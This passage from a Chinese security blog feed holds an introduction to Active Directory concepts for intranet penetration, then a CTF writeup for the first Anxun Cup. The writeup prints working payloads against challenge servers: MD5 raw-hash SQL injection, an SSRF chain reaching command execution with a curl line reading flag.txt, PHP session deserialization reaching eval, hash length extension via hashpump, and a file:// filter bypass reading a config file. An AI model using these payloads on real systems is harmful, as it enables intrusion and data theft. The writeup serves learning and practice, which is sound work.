title="父域与子域"></a>父域与子域</h4><ul><li>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</li><li>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</li><li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li><li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li><li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</li></ul><h4 id="域树（tree）"><a href="#域树（tree）" class="headerlink" title="域树（tree）"></a>域树（tree）</h4><ul><li>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</li><li>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</li><li>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</li></ul><p>abc.com 是一级域</p><p>asia是二级域</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202615.png" alt=""></p><h4 id="域森林（forest）"><a href="#域森林（forest）" class="headerlink" title="域森林（forest）"></a>域森林（forest）</h4><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202717.png" alt=""></p><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li>DNS域名服务器是进行域名（domain name）和与之相对应的IP地址（IP address）转换的服务器。</li><li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</li><li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li></ul><h2 id="0x03-活动目录（AD）"><a href="#0x03-活动目录（AD）" class="headerlink" title="0x03 活动目录（AD）"></a>0x03 活动目录（AD）</h2><ul><li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li><li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li><li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li></ul><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><ul><li>在活动口录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>“。</li><li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li></ul><p>a集团旗下有甲乙两个公司</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202828.png" alt=""></p><h3 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h3><ol><li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li><li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li><li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li><li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li><li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li><li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li></ol><h3 id="AD和DC的区别"><a href="#AD和DC的区别" class="headerlink" title="AD和DC的区别"></a>AD和DC的区别</h3><ul><li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li><li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>问题</strong>：</p><p>假如一个公司有200台电脑，我们希望某台电脑上的账户Alan可以访问每台电脑内的资源或者可以在每台电脑上登录。那么在“工作组”环境中，我们必须要在这200台电脑的各个SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须要更改200次！现在只是200台电脑的公司，如果是有5000台电脑或者上万台电脑的公司呢？估计管理员会抓狂。</p><p><strong>答案:</strong></p><p>因此产生了域。在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。</p><h2 id="0x04-域相关概念"><a href="#0x04-域相关概念" class="headerlink" title="0x04 域相关概念"></a>0x04 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202914.png" alt=""></p><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul><li>两个防火墙之间的空间被称为DMZ。</li><li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li><li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li><li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li><li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li></ul><h4 id="DMZ的屏障功能"><a href="#DMZ的屏障功能" class="headerlink" title="DMZ的屏障功能"></a>DMZ的屏障功能</h4><p>（1）内网可以访问外网<br>内网的用户需要白面地访间外网。在这一策略中，防火墙需要执行NAT。<br>（2）内网可以访间DMZ</p><p>此策略使内网用户可以使用或者管理DMZ中的服务器。<br>（3）外网不能访间内网<br>这是防火墙的基本等略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如栗要访问，就要通过vPN方式来进行。<br>（4）外网可以访问DMZ </p><p>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMz需要由防火墙完成对外地址到服务器实际地址的转换。<br>（5）DMZ不能访间内网<br>如不执行此策略，则当入侵者攻陷DMz时，内部网络将不会受保护。<br>（6）DMZ不能访何外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作.</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><p>域控制器</p><p>成员服务器</p><p>客户机</p><p>独立服务器</p><ul><li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li><li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li></ul><h2 id="0x05-域内权限解读"><a href="#0x05-域内权限解读" class="headerlink" title="0x05 域内权限解读"></a>0x05 域内权限解读</h2><h3 id="内权限解读"><a href="#内权限解读" class="headerlink" title="内权限解读"></a>内权限解读</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>域本地组，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</p><p>举例子说就是其他域都可以访问 asis.abc.com</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228202615.png" alt=""></p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>全局组，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p>很多的全局组，可以把Domain Computers加入Domain Admins全局组中</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228203015.png" alt=""></p><h5 id="全局组与域本地组区别"><a href="#全局组与域本地组区别" class="headerlink" title="全局组与域本地组区别"></a>全局组与域本地组区别</h5><p>全局组相当于域账号，可以在全局使用，域本地组相当于本地账号，只能本机上使用。</p><p>下面我来举两个例子来进一步说明（以混合模式下为例）：</p><p>　　例1：将用户张三（域帐号Z3）加入到域本地组administrators中，并不能使Z3对非DC的域成员计算机有任何特权，但若加入到全局组Domain Admins中，张三就是域管理员了，可以在全局使用，对域成员计算机是有特权的。<br>　　例2：只有在域的DC上，对资源（如：文件/夹）设置权限，你可以指派域本地组administrators；但在非DC的域成员计算机上，你是无法设置域本地组administrators的权限的。因为它是域本地组，只能在DC上使用。</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><h4 id="AGDLP"><a href="#AGDLP" class="headerlink" title="AGDLP"></a>AGDLP</h4><p>A (account):用户帐户<br>G (Global group):全局组<br>DL (Domain local group):域本地组<br>P (Permission):许可，资源权限<br>按照AGDLP的原则对用户进行组织和管理起来更容易<br>在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p><p>举个例子比如： 有两个域，A和B，A中的5个财务人员和B中的3个财务人员都需要访问B中的“FINA”文件夹。这时，可以在B中建一个DL(域本地组)，因为DL的成员可以来自所有的域，然后把这8个人都加入这个DL，并把FINA的访问权赋给DL。这样做的坏处是什么呢？因为DL是在B域中，所以管理权也在B域，如果A域中的5 个人变成6个人，那只能A域管理员通知B域管理员，将DL的成员做一下修改，B域的管理员太累了。这时候，我们改变一下，在A和B域中都各建立一个全局组（G），然后在B域中建立一个DL，把这两个G都加入B域中的DL中，然后把FINA的访问权赋给 DL。哈哈，这下两个G组都有权访问FINA文件夹了，是吗？组嵌套造成权限继承嘛！这时候，两个G分布在A和B域中，也就是A和B的管理员都可以自己管理自己的G啦，只要把那5个人和3个人加入G中，就可以了！以后有任何修改，都可以自己做了，不用麻烦B域的管理员！这就是A-G-DL-P。</p><p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>可以简单这样记忆：<br>域本地组：来自全林用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林用于全林</p><h3 id="熟悉各个组"><a href="#熟悉各个组" class="headerlink" title="熟悉各个组"></a>熟悉各个组</h3><p>本地域组的权限</p><ul><li>Administrators（管理员组） ————最重要的权限</li><li>Remote Desktop Users（远程登录组）</li><li>Print Operators（打印机操作员组）</li><li>Account Operators（帐号操作员组）</li><li>Server Operaters（服务器操作员组）</li><li>Backup Operators（备份操作员组）</li></ul><p>全局组、通用组的权限</p><ul><li>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</li><li>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</li><li>Schema Admins（架构管理员组）————最重要的权限</li><li>Domain Users（域用户组）</li></ul><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20181228203102.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透基础知识&quot;&gt;&lt;a href=&quot;#内网渗透基础知识&quot; class=&quot;headerlink&quot; title=&quot;内网渗透基础知识&quot;&gt;&lt;/a&gt;内网渗透基础知识&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x00-内网概述&quot;&gt;&lt;a href=&quot;#0x00-内网
      
    
    </summary>
    
      <category term="内网" scheme="http://Bigbroke.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://Bigbroke.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>第一届安洵杯writeup</title>
    <link href="http://Bigbroke.com/archis/6bd5dfde/"/>
    <id>http://Bigbroke.com/archis/6bd5dfde/</id>
    <published>2018-11-26T13:23:57.000Z</published>
    <updated>2018-11-26T13:37:26.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一届安洵杯writeup"><a href="#第一届安洵杯writeup" class="headerlink" title="第一届安洵杯writeup"></a>第一届安洵杯writeup</h1><h2 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a>MIsc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>D0g3{4a8a08f09d37b73795649038408b5f33}</p><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容</p><pre><code class="python">import zlibfor i in xrange(0,100000000):    buf = str(i).rjust(8,&#39;0&#39;)    #print buf    if zlib.crc32(buf) &amp; 0xffffffff == 0x0cd95dac:        print &#39;&#39;,buf</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238690.039933.jpg" alt=""></p><p>然后再用.py跑</p><pre><code class="python">import base64import hashlib#f = open(&quot;password.txt&quot;,&#39;r&#39;)#password = f.readline()password=&#39;08646247&#39;b64_str = base64.b64encode(password.encode(&#39;utf-8&#39;))hash = hashlib.md5()hash.update(b64_str)zip_passowrd = hash.hexdigest()print(zip_passowrd)</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238706.8619618.jpg" alt=""></p><p>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238750.618987.jpg" alt=""></p><p>修改高度为500</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238768.818335.jpg" alt=""></p><p>可以看到flag了导出 提取文字完事。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238782.933626.jpg" alt=""></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>第一层绕过NOHO[]=d</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543160311.0840952.jpg" alt=""></p><p>第二层 </p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238815.5454066.jpg" alt=""></p><p>MD5加密后16进制转字符</p><p>MD5注入<br>ffifdyop</p><p>成功拿到flag</p><pre><code>e5e8b79aeb213ad6e0e4664e78aff61b</code></pre><p>参考文章<a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="external">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示</p><pre><code>The Intranets are in range 10.10.1.0/16Please use right protocols :)</code></pre><p>在name提交框那里随便提交一个test，发现输出到了url的url参数</p><p>于是利用burpsuite，使用http协议扫描一波内网主机</p><p>题外话:Intruder支持多种爆破模式。分别是：单一字典爆破、多字段相同字典爆破、多字典意义对应爆破、聚合式爆破。最常用的应该是在爆破用户名和密码的时候。使用聚合方式枚举了。选择不要搞错了</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238831.9874556.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238844.715426.jpg" alt=""></p><p>有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238855.3709393.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238953.0099094.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238897.1931283.jpg" alt=""></p><p>发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示</p><pre><code>&lt;!--$_GET[d0g3]--&gt;</code></pre><p>传入</p><pre><code>http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();</code></pre><p>发现执行了命令</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238980.8754137.jpg" alt=""></p><p>于是读取flag</p><pre><code>curl -v &#39;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &#39;</code></pre><p>拿到flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239000.2885165.jpg" alt=""></p><pre><code>D0g3{SSRF_Is_So_Easy}</code></pre><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150165.3448315.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150269.1533902.jpg" alt=""></p><p>011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000</p><p>hex(int(‘011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000’,2))<br>‘0x6361697069616f362e7a6970’</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150336.3338537.jpg" alt=""></p><p>得到caipiao6.zip 下载审计</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239018.149764.jpg" alt=""></p><p>在api.php存在弱类型</p><pre><code class="php">for($i=0; $i&lt;7; $i++){    if($numbers[$i] == $win_numbers[$i]){        $same_count++;    }}</code></pre><ol><li><code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code></li></ol><p>最终可以得到 Flag</p><p>D0g3{150754621171553}</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><h3 id="double-s-签到题"><a href="#double-s-签到题" class="headerlink" title="double-s 签到题"></a>double-s 签到题</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543127815.6655116.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217010.3946216.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/www.zip" target="_blank" rel="external">http://54.200.169.99:7000/www.zip</a></p><p>下载审计构造PHP反序列化</p><p>参考文章：<a href="http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="external">http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg</a></p><pre><code class="php">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class Anti{    public $info;    function __construct()    {        $this-&gt;info = &#39;phpinfo();&#39;;    }    function __destruct()    {        eval($this-&gt;info);    }}if(isset($_GET[&#39;aa&#39;])){    if(unserialize($_GET[&#39;aa&#39;])==&#39;phpinfo&#39;)    {        $m = new Anti();    }}else{    header(&quot;location:index.html&quot;);}?&gt;</code></pre><p>这是一道PHP序列化漏洞的题，三种类型如下链接学习<br>（<a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a>）</p><p>可以看到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p><p>session.serialize_handler函数是用来设置session序列化引擎的。</p><p>这里是将session序列化引擎设置为php解析。我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p>先构造出一个phpinfo；</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543219057.63886.jpg" alt=""></p><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</code></pre><p>由phpinfo()页面继续可知，session.upload_progress.enabled为On。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218407.6353521.jpg" alt=""></p><p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218369.4250176.jpg" alt=""></p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入<code>$_SESSION</code>数据的，这里就利用到了反序列化问题<br>考虑序列化</p><pre><code class="php">&lt;?phpclass Anti{    public $info=&#39;print_r(scandir(dirname(__FILE__)));&#39;;}$obj = new Anti();echo serialize($obj);?&gt;</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217312.4219046.jpg" alt=""></p><pre><code>O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}print_r(scandir(dirname(FILE)));</code></pre><p><a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a></p><p>D0g3{Sim_Pl3_S3sSi0n}</p><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><pre><code class="php">&lt;?php@error_reporting(0);$flag = &quot;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}&quot;;$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];header(&quot;hash_key:&quot; . $hash_key);if (!empty($_COOKIE[&quot;getflag&quot;])) {    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) {        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) {            echo &quot;Great! You&#39;re in!\n&quot;;            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);        }        else {            die (&quot;Go out! Hacker!&quot;);        }    }    else {        die (&quot;LEAVE! You&#39;re not one of us!&quot;);    }}setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {    echo &quot;&lt;source_code&gt;&quot;;    }}?&gt;</code></pre><p>我们如果需要获得flag，需要满足一下条件：<br>1.Cookie中getflag的值不能为空<br>2.username必须为D0g3和password不能为D0g3<br>3.Cookie中的getmein必须等于<code>md5($secret.urldecode($username.$password))</code></p><pre><code>满足这三个条件才可获得flag，可是我们无法得知$secret的值为多少`setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));`发现下面有行代码是这样写的，将输出的`md5($secret . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;))`作为cookie输出，结合前面的数据包我们可以知道输出的值为`c3ef608fdc59d9143c39664ade7556d5` 可是这串md5是由$secret+‘Doog3Dog3’转md5而得到的，如果我们在password输入D0g3将不满足前面所需的三个条件</code></pre><p>flag为，username为D0g3，password不可为D0g3，添加cookies，变量名为getflag，要求为：</p><p>c3ef608fdc59d9143c39664ade7556d5</p><p>安装hashdump</p><pre><code>git clone https://github.com/bwall/HashPumpyum install openssl-devel yum install gcc-c++cd HashPumpmakemake install</code></pre><p>利用hashpump来构造poc</p><pre><code>hashpumpInput Signature: c3ef608fdc59d9143c39664ade7556d5Input Data: D0g3Input Key Length: 20Input Data to Add: m15e64be7722f2e46d78d483264ebc5c8D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00m</code></pre><p>将\x改为%，将POST的username改为D0g3，password改为D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test，cookie加入getflag: </p><p>15e64be7722f2e46d78d483264ebc5c8<br>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00m</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239040.2746198.jpg" alt=""></p><!-- The flag is D0g3{h4sh_1s_s0_diffic1ut_t0_me}--><h3 id="Diglett-蒙古"><a href="#Diglett-蒙古" class="headerlink" title="Diglett-蒙古"></a>Diglett-蒙古</h3><p><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239059.928092.jpg" alt=""></p><p>得到源码</p><pre><code>&lt;?php    include_once &quot;config.php&quot;;    if (isset($_POST[&#39;url&#39;])&amp;&amp;!empty($_POST[&#39;url&#39;]))    {        $url = $_POST[&#39;url&#39;];        if(preg_match(&#39;/file/&#39;,$url))        {             echo &quot;No hacker!&quot;;             echo &quot;&lt;/br&gt;&quot;;        }        $url2 = preg_replace(&#39;/file/&#39;,&#39;&#39;,$url);        $content_url = getUrlContent($url2);    }    else    {        $content_url = &quot;&quot;;    }    if(isset($_GET[&#39;hu3debug&#39;]))    {        show_source(__FILE__);    }    ?&gt;</code></pre><p>过滤了file尝试双写绕过</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239074.1999197.jpg" alt=""></p><p>读配置文件<br>url=fifilele://localhost/var/www/config.php</p><pre><code>&lt;?php$hosts = &quot;localhost&quot;;$dbusername = &quot;test_user&quot;;$dbpasswd = &quot;&quot;;$dbname = &quot;test&quot;;$dbport = 3306;$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);function initdb($conn){    $dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;    if(mysqli_query($conn,$dbinit)) return 1;    else return 0;}function safe($url){    $tmpurl = parse_url($url, PHP_URL_HOST);    if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)    {        var_dump($tmpurl);        die(&quot;&lt;h1&gt;&lt;p id=&#39;test1&#39;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);    }    return $url;}function getUrlContent($url){    $url = safe($url);    $url = escapeshellarg($url);    $pl = &quot;curl &quot;.$url;    echo $pl;    $content = shell_exec($pl);    return $content;}initdb($conn);?&gt;</code></pre><p>知道了mysql的配置内容 gopher一波<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239086.1100788.jpg" 